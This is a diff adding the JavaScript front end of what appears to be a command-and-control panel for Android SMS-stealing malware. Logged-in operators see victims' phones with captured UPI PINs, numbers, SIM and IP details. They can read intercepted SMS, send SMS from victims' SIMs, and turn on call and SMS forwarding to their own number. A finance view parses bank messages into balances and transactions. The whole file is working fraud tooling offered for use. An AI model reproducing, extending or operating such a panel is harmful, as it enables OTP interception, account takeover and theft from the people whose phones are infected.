@@ -1,0 +1,725 @@
+(function () {
+  const API = window.location.origin;
+  let token = localStorage.getItem("dp_token") || "";
+  let sessionId = "";
+  let currentUser = "";
+  let projects = [];
+  let activeProjectId = localStorage.getItem("dp_project") || "";
+  let devices = [];
+  let activeDevice = null;
+  let refreshTimer = null;
+  let currentView = "devices";
+
+  const $ = (id) => document.getElementById(id);
+  const show = (el, on) => {
+    if (typeof el === "string") el = $(el);
+    if (el) el.classList.toggle("hidden", !on);
+  };
+
+  function esc(s) {
+    const d = document.createElement("div");
+    d.textContent = s == null ? "" : String(s);
+    return d.innerHTML;
+  }
+
+  function toast(msg, isErr) {
+    const el = $("toast");
+    if (!el) return;
+    el.textContent = msg;
+    el.className = isErr ? "toast err" : "toast ok";
+    show(el, true);
+    setTimeout(() => show(el, false), 3000);
+  }
+
+  async function api(path, opts = {}) {
+    const headers = { "Content-Type": "application/json", "X-Client": "web", ...(opts.headers || {}) };
+    if (token) headers.Authorization = "Bearer " + token;
+    const res = await fetch(API + path, { ...opts, headers });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || "Request failed");
+    return data;
+  }
+
+  function parseTs(val) {
+    if (val == null || val === "") return null;
+    if (typeof val === "number") return val < 1e12 ? val * 1000 : val;
+    const n = Number(val);
+    if (!isNaN(n) && String(val).match(/^\d+$/)) return n < 1e12 ? n * 1000 : n;
+    const d = new Date(val);
+    return isNaN(d.getTime()) ? null : d.getTime();
+  }
+
+  function fmtDate(ts) {
+    if (!ts) return "—";
+    return new Date(ts).toLocaleString("en-IN", {
+      day: "2-digit", month: "2-digit", year: "numeric",
+      hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: true,
+    });
+  }
+
+  function fmtAgo(ts) {
+    if (!ts) return "—";
+    const diff = Date.now() - ts;
+    if (diff < 0) return "Just now";
+    const s = Math.floor(diff / 1000);
+    const m = Math.floor(s / 60);
+    const h = Math.floor(m / 60);
+    const d = Math.floor(h / 24);
+    if (s < 60) return s + "s ago";
+    if (m < 60) return m + "m ago";
+    if (h < 24) return h + "h " + (m % 60) + "m ago";
+    if (d < 30) return d + "d ago";
+    return fmtDate(ts);
+  }
+
+  function parseSims(raw) {
+    if (!raw) return [];
+    if (Array.isArray(raw)) return raw;
+    if (typeof raw === "object") return Object.values(raw);
+    return [];
+  }
+
+  function parseDevice(id, raw) {
+    if (!raw || typeof raw !== "object") return null;
+    const sims = parseSims(raw.sims);
+    const lastSeen = parseTs(
+      raw.lastSeen ?? raw.last_seen ?? raw.lastOnline ?? raw.last_online ??
+      raw.lastActive ?? raw.updatedAt ?? raw.dateTime ?? raw.time
+    );
+    return {
+      id,
+      name: String(raw.modelName || raw.model || raw.deviceName || id),
+      battery: String(raw.battery ?? "—"),
+      batteryDisplay: raw.battery != null
+        ? (String(raw.battery).includes("%") ? String(raw.battery) : String(raw.battery) + "%")
+        : "—",
+      status: raw.status === true,
+      phone: String(raw.mobNo || sims[0]?.phoneNumber || sims[0]?.number || "N/A"),
+      android: String(raw.androidV || raw.androidVersion || "—"),
+      sdk: String(raw.sdkV || raw.sdkVersion || "—"),
+      upipin: raw.upipin ? String(raw.upipin) : null,
+      notes: String(raw.notes || raw.note || ""),
+      ip: String(raw.ip_address || raw.ip || "—"),
+      storage: String(raw.storage || "—"),
+      cpu: String(raw.cpu_arch || "—"),
+      provider: String(raw.service_provider || "—"),
+      sims,
+      lastSeen,
+      lastSeenFmt: lastSeen ? fmtDate(lastSeen) : "—",
+      lastSeenAgo: lastSeen ? fmtAgo(lastSeen) : "—",
+      raw,
+    };
+  }
+
+  function parseSms(data) {
+    const list = [];
+    if (!data || typeof data !== "object") return list;
+    const entries = Object.entries(data);
+    const slice = entries.length > 500 ? entries.slice(entries.length - 500) : entries;
+    for (const [, raw] of slice) {
+      if (!raw || typeof raw !== "object") continue;
+      const text = String(raw.message || raw.body || raw.text || "").trim();
+      if (!text) continue;
+      list.push({
+        sender: String(raw.sender || raw.from || "Unknown"),
+        body: text,
+        time: String(raw.dateTime || raw.date || ""),
+      });
+    }
+    return list.reverse();
+  }
+
+  function simLabel(sim, idx) {
+    if (!sim) return "Unknown";
+    const carrier = sim.carrierName || sim.carrier || sim.operator || sim.serviceProvider || "";
+    const state = sim.simState || sim.state || sim.status || "";
+    const phone = sim.phoneNumber || sim.number || sim.mobNo || "";
+    const parts = [state, carrier, phone].filter(Boolean);
+    return parts.length ? parts.join(" — ") : "SIM " + (idx + 1);
+  }
+
+  // ─── Auth ───────────────────────────────────────────────
+  function initAuth() {
+    document.querySelectorAll(".tab").forEach((t) => {
+      t.onclick = () => {
+        document.querySelectorAll(".tab").forEach((x) => x.classList.remove("active"));
+        t.classList.add("active");
+        show("loginPanel", t.dataset.tab === "login");
+        show("registerPanel", t.dataset.tab === "register");
+        setErr("loginErr", "");
+        setErr("regErr", "");
+      };
+    });
+
+    $("btnLogin").onclick = doLogin;
+    $("btn2fa").onclick = do2fa;
+    $("btnRegister").onclick = doRegister;
+    $("btnLogout").onclick = logout;
+
+    if (token) {
+      api("/api/auth/me").then((d) => enterApp(d.username)).catch(logout);
+    }
+  }
+
+  function setErr(id, msg) {
+    const el = $(id);
+    if (!msg) { show(el, false); return; }
+    el.textContent = msg;
+    show(el, true);
+  }
+
+  async function doLogin() {
+    setErr("loginErr", "");
+    const username = $("loginUser").value.trim();
+    const password = $("loginPass").value;
+    if (!username || !password) return setErr("loginErr", "Username aur password daalo");
+    $("btnLogin").disabled = true;
+    try {
+      const data = await api("/api/auth/login", { method: "POST", body: JSON.stringify({ username, password }) });
+      if (data.requires2FA) {
+        sessionId = data.sessionId;
+        show("loginPanel", false);
+        show("twofaPanel", true);
+      } else {
+        token = data.token;
+        localStorage.setItem("dp_token", token);
+        enterApp(data.username);
+      }
+    } catch (e) {
+      setErr("loginErr", e.message);
+    } finally {
+      $("btnLogin").disabled = false;
+    }
+  }
+
+  async function do2fa() {
+    setErr("twofaErr", "");
+    const code = $("twofaCode").value.trim();
+    if (!code) return setErr("twofaErr", "Code daalo");
+    try {
+      const data = await api("/api/auth/verify-2fa", { method: "POST", body: JSON.stringify({ sessionId, code }) });
+      token = data.token;
+      localStorage.setItem("dp_token", token);
+      show("twofaPanel", false);
+      enterApp(data.username);
+    } catch (e) {
+      setErr("twofaErr", e.message);
+    }
+  }
+
+  async function doRegister() {
+    setErr("regErr", "");
+    show("regOk", false);
+    const adminKey = $("regAdminKey").value.trim();
+    const username = $("regUser").value.trim();
+    const password = $("regPass").value;
+    const pass2 = $("regPass2").value;
+    if (!adminKey) return setErr("regErr", "Admin Key required");
+    if (!username || !password) return setErr("regErr", "Username aur password daalo");
+    if (password !== pass2) return setErr("regErr", "Password match nahi karta");
+    $("btnRegister").disabled = true;
+    try {
+      const res = await fetch(API + "/api/admin/accounts", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "X-Admin-Key": adminKey },
+        body: JSON.stringify({ username, password }),
+      });
+      const d = await res.json();
+      if (!res.ok) throw new Error(d.error || "Failed");
+      $("regOk").textContent = "Account ban gaya! Ab login karo.";
+      show("regOk", true);
+      $("regUser").value = "";
+      $("regPass").value = "";
+      $("regPass2").value = "";
+    } catch (e) {
+      setErr("regErr", e.message);
+    } finally {
+      $("btnRegister").disabled = false;
+    }
+  }
+
+  function logout() {
+    token = "";
+    activeProjectId = "";
+    localStorage.removeItem("dp_token");
+    localStorage.removeItem("dp_project");
+    stopRefresh();
+    show("appView", false);
+    show("authView", true);
+    show("loginPanel", true);
+    show("registerPanel", false);
+    show("twofaPanel", false);
+  }
+
+  // ─── App ────────────────────────────────────────────────
+  async function enterApp(username) {
+    currentUser = username;
+    show("authView", false);
+    show("appView", true);
+    $("sidebarUser").innerHTML = "Logged in as <b>" + esc(username) + "</b>";
+    await loadProjects();
+    initNav();
+    if (activeProjectId && projects.find((p) => p.id === activeProjectId)) {
+      switchView("devices");
+      loadDevices();
+      startRefresh();
+    } else if (projects.length === 1) {
+      selectProject(projects[0].id);
+    } else {
+      switchView("projects");
+    }
+  }
+
+  function initNav() {
+    document.querySelectorAll(".nav-item[data-view]").forEach((el) => {
+      el.onclick = () => {
+        const v = el.dataset.view;
+        if (v === "devices" && !activeProjectId) {
+          toast("Pehle Firebase project select karo", true);
+          switchView("projects");
+          return;
+        }
+        switchView(v);
+      };
+    });
+    $("btnRefresh").onclick = () => {
+      if (currentView === "devices") loadDevices();
+      else if (currentView === "detail" && activeDevice) openDevice(activeDevice.id);
+    };
+    $("btnBackDevices").onclick = () => { switchView("devices"); loadDevices(); };
+    $("deviceSearch").oninput = renderDeviceGrid;
+  }
+
+  function switchView(view) {
+    currentView = view;
+    document.querySelectorAll(".nav-item[data-view]").forEach((el) => {
+      el.classList.toggle("active", el.dataset.view === view);
+    });
+    show("viewDevices", view === "devices");
+    show("viewProjects", view === "projects");
+    show("viewDetail", view === "detail");
+    if (view === "projects") loadProjects(true);
+  }
+
+  function startRefresh() {
+    stopRefresh();
+    refreshTimer = setInterval(() => {
+      if (currentView === "devices") loadDevices(true);
+      else if (currentView === "detail" && activeDevice) loadDeviceDetail(activeDevice.id, true);
+    }, 15000);
+  }
+
+  function stopRefresh() {
+    if (refreshTimer) clearInterval(refreshTimer);
+    refreshTimer = null;
+  }
+
+  async function loadProjects(renderList) {
+    try {
+      const data = await api("/api/firebase-projects");
+      projects = data.projects || [];
+      if (renderList) renderProjectList();
+      $("projectSelect").innerHTML = projects.map((p) =>
+        `<option value="${esc(p.id)}" ${p.id === activeProjectId ? "selected" : ""}>${esc(p.name)}</option>`
+      ).join("") || '<option value="">No project</option>';
+      $("projectSelect").onchange = (e) => selectProject(e.target.value);
+    } catch (e) {
+      if (e.message.includes("Unauthorized")) logout();
+      else toast(e.message, true);
+    }
+  }
+
+  function selectProject(id) {
+    activeProjectId = id;
+    localStorage.setItem("dp_project", id);
+    $("projectSelect").value = id;
+    switchView("devices");
+    loadDevices();
+    startRefresh();
+  }
+
+  function renderProjectList() {
+    const box = $("fbList");
+    box.innerHTML = "";
+    show("fbEmpty", projects.length === 0);
+    projects.forEach((p) => {
+      const div = document.createElement("div");
+      div.className = "fb-item" + (p.id === activeProjectId ? " selected" : "");
+      div.innerHTML = `
+        <div>
+          <div class="fb-name">${esc(p.name)}</div>
+          <div class="fb-url">${esc(p.firebaseUrl || "")}</div>
+        </div>
+        <div style="display:flex;gap:6px;flex-shrink:0">
+          <button class="btn btn-sm btn-cyan" data-open="${p.id}">Open</button>
+          <button class="btn btn-sm btn-outline" data-test="${p.id}">Test</button>
+          <button class="btn btn-sm btn-danger" data-del="${p.id}">Del</button>
+        </div>`;
+      box.appendChild(div);
+    });
+    box.querySelectorAll("[data-open]").forEach((b) => { b.onclick = () => selectProject(b.dataset.open); });
+    box.querySelectorAll("[data-test]").forEach((b) => {
+      b.onclick = async () => {
+        try { await api("/api/firebase-projects/" + b.dataset.test + "/test", { method: "POST" }); toast("Connection OK!"); }
+        catch (e) { toast(e.message, true); }
+      };
+    });
+    box.querySelectorAll("[data-del]").forEach((b) => {
+      b.onclick = async () => {
+        if (!confirm("Delete this Firebase?")) return;
+        try {
+          await api("/api/firebase-projects/" + b.dataset.del, { method: "DELETE" });
+          if (activeProjectId === b.dataset.del) activeProjectId = "";
+          loadProjects(true);
+        } catch (e) { toast(e.message, true); }
+      };
+    });
+  }
+
+  $("btnAddFb").onclick = async () => {
+    const name = $("fbName").value.trim();
+    const firebaseUrl = $("fbUrl").value.trim();
+    const firebaseSecret = $("fbSecret").value.trim();
+    if (!name || !firebaseUrl || !firebaseSecret) return toast("Saari fields bhari karo", true);
+    $("btnAddFb").disabled = true;
+    try {
+      await api("/api/firebase-projects", { method: "POST", body: JSON.stringify({ name, firebaseUrl, firebaseSecret }) });
+      $("fbName").value = ""; $("fbUrl").value = ""; $("fbSecret").value = "";
+      toast("Firebase added!");
+      await loadProjects(true);
+    } catch (e) { toast(e.message, true); }
+    finally { $("btnAddFb").disabled = false; }
+  };
+
+  async function loadDevices(silent) {
+    if (!activeProjectId) return;
+    if (!silent) $("deviceGrid").innerHTML = '<div class="empty">Loading devices...</div>';
+    try {
+      const data = await api("/api/projects/" + activeProjectId + "/clients");
+      devices = Object.entries(data || {}).map(([id, raw]) => parseDevice(id, raw)).filter(Boolean);
+      devices.sort((a, b) => (b.status - a.status) || (b.lastSeen || 0) - (a.lastSeen || 0));
+      const online = devices.filter((d) => d.status).length;
+      $("statOnline").textContent = online;
+      $("statTotal").textContent = devices.length;
+      $("statOffline").textContent = devices.length - online;
+      renderDeviceGrid();
+    } catch (e) {
+      if (!silent) $("deviceGrid").innerHTML = '<div class="empty">' + esc(e.message) + '</div>';
+    }
+  }
+
+  function renderDeviceGrid() {
+    const q = ($("deviceSearch").value || "").trim().toLowerCase();
+    const filtered = q ? devices.filter((d) =>
+      d.name.toLowerCase().includes(q) || d.phone.toLowerCase().includes(q) ||
+      d.id.toLowerCase().includes(q) || d.notes.toLowerCase().includes(q)
+    ) : devices;
+
+    const box = $("deviceGrid");
+    if (!filtered.length) {
+      box.innerHTML = '<div class="empty">Koi device nahi mila</div>';
+      return;
+    }
+    box.innerHTML = filtered.map((d) => `
+      <div class="device-card" data-id="${esc(d.id)}">
+        <div class="row">
+          <div class="model">${esc(d.name)}</div>
+          <span class="${d.status ? "status-online" : "status-offline"}">${d.status ? "Online" : "Offline"}</span>
+        </div>
+        <div class="field"><span>Phone: </span><b>${esc(d.phone)}</b></div>
+        <div class="field"><span>UPI Pin: </span><b>${esc(d.upipin || "N/A")}</b></div>
+        <div class="field"><span>Model: </span><b>${esc(d.name)}</b></div>
+        <div class="field"><span>Battery: </span><b>${esc(d.batteryDisplay)}</b></div>
+        <div class="date">${esc(d.lastSeenFmt !== "—" ? d.lastSeenFmt : "—")}</div>
+        <div class="notes">${d.notes ? esc(d.notes) : "No Notes"}</div>
+        <div class="card-actions">
+          <button class="icon-btn" title="System Settings" data-settings="${esc(d.id)}">⚙</button>
+          <button class="icon-btn" title="Last Seen" data-lastseen="${esc(d.id)}">🕐</button>
+          <button class="icon-btn finance" title="Finance" data-finance="${esc(d.id)}">$</button>
+          <button class="icon-btn" title="Forward" data-forward="${esc(d.id)}">📞</button>
+          <button class="icon-btn danger" title="Delete" data-del="${esc(d.id)}">🗑</button>
+        </div>
+      </div>
+    `).join("");
+
+    box.querySelectorAll(".device-card").forEach((card) => {
+      card.onclick = (e) => {
+        if (e.target.closest(".icon-btn")) return;
+        openDevice(card.dataset.id);
+      };
+    });
+    box.querySelectorAll("[data-settings]").forEach((b) => { b.onclick = (e) => { e.stopPropagation(); showSettingsModal(b.dataset.settings); }; });
+    box.querySelectorAll("[data-lastseen]").forEach((b) => { b.onclick = (e) => { e.stopPropagation(); showLastSeenModal(b.dataset.lastseen); }; });
+    box.querySelectorAll("[data-finance]").forEach((b) => { b.onclick = (e) => { e.stopPropagation(); showFinanceModal(b.dataset.finance); }; });
+    box.querySelectorAll("[data-forward]").forEach((b) => { b.onclick = (e) => { e.stopPropagation(); showForwardModal(b.dataset.forward); }; });
+    box.querySelectorAll("[data-del]").forEach((b) => {
+      b.onclick = async (e) => {
+        e.stopPropagation();
+        if (!confirm("Delete device?")) return;
+        try {
+          await api("/api/projects/" + activeProjectId + "/clients/" + b.dataset.del, { method: "DELETE" });
+          loadDevices();
+        } catch (err) { toast(err.message, true); }
+      };
+    });
+  }
+
+  async function openDevice(id) {
+    activeDevice = devices.find((d) => d.id === id) || null;
+    if (!activeDevice) {
+      try {
+        const raw = await api("/api/projects/" + activeProjectId + "/clients/" + id);
+        activeDevice = parseDevice(id, raw);
+      } catch (e) { toast(e.message, true); return; }
+    }
+    switchView("detail");
+    renderDeviceDetail();
+    loadDeviceDetail(id);
+  }
+
+  function renderDeviceDetail() {
+    const d = activeDevice;
+    if (!d) return;
+    $("detailTitle").textContent = d.name;
+    $("detailStatus").className = "badge " + (d.status ? "badge-online" : "badge-offline");
+    $("detailStatus").textContent = d.status ? "Online" : "Offline";
+    $("detailNotes").value = d.notes || "";
+    $("infoModel").textContent = d.name;
+    $("infoPhone").textContent = d.phone;
+    $("infoUpi").textContent = d.upipin || "N/A";
+    $("infoSim1").textContent = d.sims[0] ? simLabel(d.sims[0], 0) : "Not Available";
+    $("infoSim2").textContent = d.sims[1] ? simLabel(d.sims[1], 1) : "Not Available";
+    $("infoDate").textContent = d.lastSeenFmt;
+  }
+
+  async function loadDeviceDetail(id, silent) {
+    try {
+      const [raw, smsData] = await Promise.all([
+        api("/api/projects/" + activeProjectId + "/clients/" + id),
+        api("/api/projects/" + activeProjectId + "/messages/" + id),
+      ]);
+      activeDevice = parseDevice(id, raw);
+      renderDeviceDetail();
+      const sms = parseSms(smsData);
+      window._detailSms = sms;
+      renderSmsList(sms);
+      if (!silent) toast("Device updated");
+    } catch (e) {
+      if (!silent) toast(e.message, true);
+    }
+  }
+
+  function renderSmsList(list) {
+    const q = ($("smsSearch").value || "").trim().toLowerCase();
+    const filtered = q ? list.filter((s) => s.sender.toLowerCase().includes(q) || s.body.toLowerCase().includes(q)) : list;
+    $("smsCount").textContent = filtered.length + " / " + list.length + " messages";
+    const box = $("smsList");
+    if (!filtered.length) {
+      box.innerHTML = '<div class="empty">No messages</div>';
+      return;
+    }
+    box.innerHTML = filtered.map((s, i) => `
+      <div class="sms-item">
+        <div class="body">${esc(s.body)}</div>
+        <div class="meta">
+          <span>${esc(s.sender)}</span>
+          <span>${esc(s.time)}</span>
+          <span>incoming</span>
+          <button class="btn btn-sm btn-outline" data-copy-idx="${i}">Copy</button>
+        </div>
+      </div>
+    `).join("");
+    box.querySelectorAll("[data-copy-idx]").forEach((btn) => {
+      btn.onclick = () => {
+        const idx = Number(btn.dataset.copyIdx);
+        navigator.clipboard.writeText(filtered[idx].body);
+        toast("Copied!");
+      };
+    });
+  }
+
+  $("smsSearch").oninput = () => renderSmsList(window._detailSms || []);
+  $("btnSaveNotes").onclick = async () => {
+    if (!activeDevice) return;
+    try {
+      await api("/api/projects/" + activeProjectId + "/clients/" + activeDevice.id + "/notes", {
+        method: "PATCH",
+        body: JSON.stringify({ notes: $("detailNotes").value }),
+      });
+      activeDevice.notes = $("detailNotes").value;
+      toast("Notes saved!");
+    } catch (e) { toast(e.message, true); }
+  };
+
+  $("btnSendSms").onclick = async () => {
+    if (!activeDevice) return;
+    const to = $("smsTo").value.trim();
+    const message = $("smsMsg").value.trim();
+    const sim = $("smsSim").value;
+    if (!to || !message) return toast("Number aur message daalo", true);
+    try {
+      await api("/api/projects/" + activeProjectId + "/clients/" + activeDevice.id + "/send-sms", {
+        method: "POST",
+        body: JSON.stringify({ to, message, from: Number(sim) || 1 }),
+      });
+      toast("SMS queued!");
+      $("smsMsg").value = "";
+    } catch (e) { toast(e.message, true); }
+  };
+
+  document.querySelectorAll(".tab-inner").forEach((t) => {
+    t.onclick = () => {
+      document.querySelectorAll(".tab-inner").forEach((x) => x.classList.remove("active"));
+      t.classList.add("active");
+      show("panelSms", t.dataset.panel === "sms");
+      show("panelSend", t.dataset.panel === "send");
+    };
+  });
+
+  $("detailBtnSettings").onclick = () => activeDevice && showSettingsModal(activeDevice.id);
+  $("detailBtnLastSeen").onclick = () => activeDevice && showLastSeenModal(activeDevice.id);
+  $("detailBtnForward").onclick = () => activeDevice && showForwardModal(activeDevice.id);
+  $("detailBtnFinance").onclick = () => activeDevice && showFinanceModal(activeDevice.id);
+  $("detailBtnDelete").onclick = async () => {
+    if (!activeDevice || !confirm("Delete device?")) return;
+    try {
+      await api("/api/projects/" + activeProjectId + "/clients/" + activeDevice.id, { method: "DELETE" });
+      switchView("devices");
+      loadDevices();
+    } catch (e) { toast(e.message, true); }
+  };
+
+  function getDeviceById(id) {
+    return devices.find((d) => d.id === id) || (activeDevice && activeDevice.id === id ? activeDevice : null);
+  }
+
+  function showLastSeenModal(id) {
+    const d = getDeviceById(id);
+    if (!d) return;
+    $("modalLastSeenStatus").textContent = d.status ? "Online" : "Offline";
+    $("modalLastSeenStatus").className = "val " + (d.status ? "green" : "orange");
+    $("modalLastSeenDot").className = "dot " + (d.status ? "green" : "red");
+    $("modalLastSeenTime").textContent = d.lastSeenFmt;
+    show("modalLastSeen", true);
+  }
+
+  function showSettingsModal(id) {
+    const d = getDeviceById(id);
+    if (!d) return;
+    $("modalSettingsBody").innerHTML = `
+      <div class="info-list">
+        <div class="info-row"><span class="info-lbl">📱 Device ID</span><span class="info-val">${esc(d.id)}</span></div>
+        <div class="info-row"><span class="info-lbl">📱 Model</span><span class="info-val">${esc(d.name)}</span></div>
+        <div class="info-row"><span class="info-lbl">🔋 Battery</span><span class="info-val">${esc(d.batteryDisplay)}</span></div>
+        <div class="info-row"><span class="info-lbl">🤖 Android</span><span class="info-val">${esc(d.android)}</span></div>
+        <div class="info-row"><span class="info-lbl">⚙ SDK</span><span class="info-val">${esc(d.sdk)}</span></div>
+        <div class="info-row"><span class="info-lbl">📞 Phone</span><span class="info-val">${esc(d.phone)}</span></div>
+        <div class="info-row"><span class="info-lbl">💳 UPI Pin</span><span class="info-val">${esc(d.upipin || "N/A")}</span></div>
+        <div class="info-row"><span class="info-lbl">📅 Date</span><span class="info-val">${esc(d.lastSeenFmt)}</span></div>
+        <div class="info-row"><span class="info-lbl">🌐 IP</span><span class="info-val">${esc(d.ip)}</span></div>
+        <div class="info-row"><span class="info-lbl">💾 Storage</span><span class="info-val">${esc(d.storage)}</span></div>
+      </div>`;
+    show("modalSettings", true);
+  }
+
+  async function showForwardModal(id) {
+    window._forwardDeviceId = id;
+    const d = getDeviceById(id);
+    $("forwardModel").textContent = d ? d.name : id;
+    $("forwardSim1Label").textContent = d?.sims[0] ? simLabel(d.sims[0], 0) : "Loading...";
+    $("forwardSim2Label").textContent = d?.sims[1] ? simLabel(d.sims[1], 1) : "Unknown";
+    try {
+      const st = await api("/api/projects/" + activeProjectId + "/clients/" + id + "/forwarding");
+      $("forwardCallStatus").textContent = "Call: " + (st.call === "active" ? "Active" : "Inactive");
+      $("forwardSmsStatus").textContent = "SMS: " + (st.sms === "active" ? "Active" : "Inactive");
+      if (st.forwardTo) $("forwardTo").value = st.forwardTo;
+    } catch (_) {
+      $("forwardCallStatus").textContent = "Call: Inactive";
+      $("forwardSmsStatus").textContent = "SMS: Inactive";
+    }
+    show("modalForward", true);
+  }
+
+  async function showFinanceModal(id) {
+    $("financeBody").innerHTML = '<div class="empty">Loading finance report...</div>';
+    show("modalFinance", true);
+    try {
+      const report = await api("/api/projects/" + activeProjectId + "/finance/" + id);
+      const banks = report.banks || [];
+      const sum = report.summary || {};
+      if (!banks.length) {
+        $("financeBody").innerHTML = '<div class="empty">Koi bank SMS nahi mila (' + (sum.smsScanned || 0) + ' scanned)</div>';
+        return;
+      }
+      $("financeBody").innerHTML = `
+        <div class="stats-row" style="margin-bottom:14px">
+          <div class="stat-pill"><div class="lbl">Banks</div><div class="val cyan">${sum.bankCount || banks.length}</div></div>
+          <div class="stat-pill"><div class="lbl">Balance</div><div class="val" style="color:var(--amber)">₹${esc(sum.totalBalance || "0")}</div></div>
+          <div class="stat-pill"><div class="lbl">Credit</div><div class="val green">₹${esc(sum.totalCredit || "0")}</div></div>
+          <div class="stat-pill"><div class="lbl">Debit</div><div class="val" style="color:var(--red)">₹${esc(sum.totalDebit || "0")}</div></div>
+        </div>
+        ${banks.map((b) => `
+          <div class="finance-bank">
+            <div class="name">${esc(b.bankName)} ${b.accountLast4 ? "••" + esc(b.accountLast4) : ""}</div>
+            <div class="bal">₹${esc(b.availableBalance)}</div>
+            <div class="sub">Cr ₹${esc(b.totalCredit)} · Dr ₹${esc(b.totalDebit)} · ${b.transactionCount || 0} txns</div>
+          </div>
+        `).join("")}`;
+    } catch (e) {
+      $("financeBody").innerHTML = '<div class="empty">' + esc(e.message) + '</div>';
+    }
+  }
+
+  document.querySelectorAll(".modal-overlay [data-close]").forEach((b) => {
+    b.onclick = () => show(b.closest(".modal-overlay"), false);
+  });
+
+  document.querySelectorAll(".radio-card[data-sim]").forEach((c) => {
+    c.onclick = () => {
+      document.querySelectorAll(".radio-card[data-sim]").forEach((x) => x.classList.remove("selected"));
+      c.classList.add("selected");
+      c.querySelector("input").checked = true;
+    };
+  });
+  document.querySelectorAll(".radio-card[data-ftype]").forEach((c) => {
+    c.onclick = () => {
+      document.querySelectorAll(".radio-card[data-ftype]").forEach((x) => x.classList.remove("selected"));
+      c.classList.add("selected");
+      c.querySelector("input").checked = true;
+    };
+  });
+
+  $("btnActivateForward").onclick = async () => {
+    const id = window._forwardDeviceId;
+    if (!id) return;
+    const sim = document.querySelector('input[name="fwdSim"]:checked')?.value || "1";
+    const type = document.querySelector('input[name="fwdType"]:checked')?.value || "call";
+    const to = $("forwardTo").value.trim();
+    if (!to) return toast("Forward number daalo", true);
+    try {
+      await api("/api/projects/" + activeProjectId + "/clients/" + id + "/forwarding", {
+        method: "POST",
+        body: JSON.stringify({ type, sim: Number(sim), to, active: true }),
+      });
+      toast("Forwarding activated!");
+      showForwardModal(id);
+    } catch (e) { toast(e.message, true); }
+  };
+
+  $("btnDeactivateForward").onclick = async () => {
+    const id = window._forwardDeviceId;
+    if (!id) return;
+    const sim = document.querySelector('input[name="fwdSim"]:checked')?.value || "1";
+    const type = document.querySelector('input[name="fwdType"]:checked')?.value || "call";
+    try {
+      await api("/api/projects/" + activeProjectId + "/clients/" + id + "/forwarding", {
+        method: "POST",
+        body: JSON.stringify({ type, sim: Number(sim), to: "", active: false }),
+      });
+      toast("Forwarding deactivated!");
+      showForwardModal(id);
+    } catch (e) { toast(e.message, true); }
+  };
+
+  initAuth();
+})();
